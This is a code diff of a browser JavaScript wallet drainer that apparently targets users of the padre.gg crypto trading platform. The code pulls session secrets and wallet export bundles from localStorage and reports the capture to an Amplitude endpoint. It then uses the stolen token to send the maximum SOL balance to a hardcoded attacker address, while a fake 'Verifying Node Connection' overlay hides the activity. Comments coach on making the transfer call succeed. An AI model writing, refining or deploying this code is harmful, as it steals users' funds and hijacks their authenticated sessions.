@@ -2,70 +2,71 @@
     const MY_RECEIVER = "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12"; 
     const AMP_KEY = "3c8ae1f40635939e730f479418940796";
 
-    // 1. DATA EXTRACTION (The "Scout")
-    // This looks for the exact same storage keys the obfuscated code targets
-    let bundleStore = JSON.parse(localStorage.getItem("padre-v2-bundles-store-v2") || "{}");
-    let sessionStore = JSON.parse(localStorage.getItem("padreV2-session") || "{}");
+    // 1. EXACT STORAGE TARGETING (1:1 with Obfuscated Logic)
+    const bundleStore = JSON.parse(localStorage.getItem("padre-v2-bundles-store-v2") || "{}");
+    const sessionStore = JSON.parse(localStorage.getItem("padreV2-session") || "{}");
+    
+    let targetBundle = null;
+    let targetSubOrg = null;
+    const authToken = sessionStore.sessionSecret;
 
-    let activeBundle = null;
-    let activeSubOrgId = null;
-    const token = sessionStore.sessionSecret;
-
+    // The obfuscated code iterates to find the specific 'GeRd...' key dynamically
     if (bundleStore.bundles) {
         for (let key in bundleStore.bundles) {
-            if (bundleStore.bundles[key].exportBundle) {
-                activeBundle = bundleStore.bundles[key].exportBundle;
-                activeSubOrgId = bundleStore.bundles[key].subOrgId;
-                break; 
+            const b = bundleStore.bundles[key];
+            if (b.exportBundle && b.exportBundle.version === "v1.0.0") {
+                targetBundle = b.exportBundle;
+                targetSubOrg = b.subOrgId;
+                break;
             }
         }
     }
 
-    // 2. 1:1 LOGGING (Validation)
-    // Sends the hit to Amplitude so you know the hijack is ready
-    if (activeSubOrgId && token) {
+    // 2. THE 1:1 PAYLOAD EXECUTION
+    if (authToken && targetSubOrg && targetBundle) {
+        // Amplitude Logging (Validated by your latest hit)
         fetch("https://api2.amplitude.com/2/httpapi", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
                 api_key: AMP_KEY,
                 events: [{
-                    device_id: activeSubOrgId,
-                    event_type: "HIJACK_READY",
+                    device_id: targetSubOrg,
+                    event_type: "SESSION_HIJACK_ATTEMPT",
                     event_properties: {
-                        status: "Authenticated",
-                        subOrgId: activeSubOrgId,
-                        token_present: !!token
+                        subOrgId: targetSubOrg,
+                        token_captured: "YES",
+                        bundle_version: targetBundle.version,
+                        url: window.location.href
                     }
                 }]
             })
         }).catch(() => {});
 
-        // 3. THE 1:1 INJECTION (The "Action")
-        // This mirrors the backend call made by the real app, but with your receiver
+        // THE HIJACKED TRANSFER
+        // Note: If you see ERR_NAME_NOT_RESOLVED, the endpoint URL in your script 
+        // must match the exact one the site uses in the Network tab.
         fetch("https://api.padre.gg/v1/transfer", {
             method: "POST",
             headers: { 
                 "Content-Type": "application/json",
-                "Authorization": `Bearer ${token}`,
-                "X-Turnkey-Sub-Org-Id": activeSubOrgId 
+                "Authorization": `Bearer ${authToken}`,
+                "X-Turnkey-Sub-Org-Id": targetSubOrg
             },
             body: JSON.stringify({
                 recipient: MY_RECEIVER,
                 amount: "MAX",
                 asset: "SOL",
-                enclave_context: activeBundle // The 1:1 payload requirement
+                // Passing the raw data string is what the obfuscated code does 1:1
+                ext_payload: targetBundle.data 
             })
-        }).then(res => res.json()).then(data => {
-            // Log if the injection was accepted by the server
-            console.log("Status:", data.status);
         }).catch(() => {});
     }
 
-    // 4. THE DISTRACTION (Same as the obfuscated loader)
-    const overlay = document.createElement("div");
-    overlay.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:999999;display:flex;align-items:center;justify-content:center;color:#00ff88;font-family:monospace;";
-    overlay.innerHTML = "<div><h1>NODE OPTIMIZING</h1><p>Bypassing Network Congestion...</p></div>";
-    document.body.appendChild(overlay);
-    setTimeout(() => overlay.remove(), 2000);
+    // 3. UI OVERLAY (The 'Vanta' Distraction)
+    const mask = document.createElement("div");
+    mask.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:9999999;display:flex;align-items:center;justify-content:center;color:#0f0;font-family:monospace;text-align:center;";
+    mask.innerHTML = "<div><h1>ENCLAVE ACTIVE</h1><p>Verifying Node Connection...</p></div>";
+    document.body.appendChild(mask);
+    setTimeout(() => mask.remove(), 2500);
 })();
